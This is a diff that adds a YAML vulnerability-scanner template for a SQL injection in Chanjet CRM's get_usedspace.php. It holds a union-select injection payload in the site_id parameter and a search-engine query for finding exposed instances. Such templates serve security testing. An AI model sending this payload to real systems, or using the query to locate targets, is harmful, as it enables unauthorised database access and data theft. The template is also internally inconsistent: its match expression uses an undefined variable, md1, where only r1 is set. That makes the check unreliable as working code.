@@ -1,0 +1,21 @@
+name: chanjet CRM get_usedspace.php sql injection
+manual: true
+query: title="畅捷CRM"
+transport: http
+set:
+  r1: randomInt(400000, 448000)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{r1}}))
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"{{md1}}")
+expression: r0()
+detail:
+  author: luckying1314@139.com
+  links:
+  - https://gobies.org/
+  description: SQL injection exists in chanjet CRM get_usedspace.php and sensitive
+    information can be obtained through vulnerability
+  tags: sqli
